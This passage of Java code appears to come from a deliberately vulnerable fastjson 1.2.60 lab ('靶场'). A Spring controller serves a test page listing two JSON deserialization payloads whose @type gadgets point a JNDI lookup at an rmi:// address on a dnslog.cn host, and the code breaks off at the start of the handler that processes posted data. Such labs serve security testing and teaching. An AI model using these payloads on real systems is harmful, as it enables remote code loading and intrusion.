...
public class FastjsonController {
    ...
    @GetMapping(value = {"/", "/fastjson-1.2.60"}, produces = "text/html;charset=UTF-8")
    @ResponseBody
    public String index() {
        return buildPage("fastjson-1.2.60 靶场测试页", "/fastjson1.2.60-process", new String[]{
                "{\"@type\":\"oracle.jdbc.connector.OracleManagedConnectionFactory\",\"xaDataSourceName\":\"rmi://fastjson1.2.60-process.dnslog.cn/ExportObject\"}",
                "{\"@type\":\"org.apache.commons.configuration.JNDIConfiguration\",\"prefix\":\"rmi://fastjson1.2.60-process.dnslog.cn/ExportObject\"}"
        }, "{\"name\":\"123\",\"email\":\"123@123\",\"age\":\"123\"}");
    }

    @PostMapping("/fastjson1.2.60-process")
    public String fastjson1_2_60_process(@RequestBody String data) {
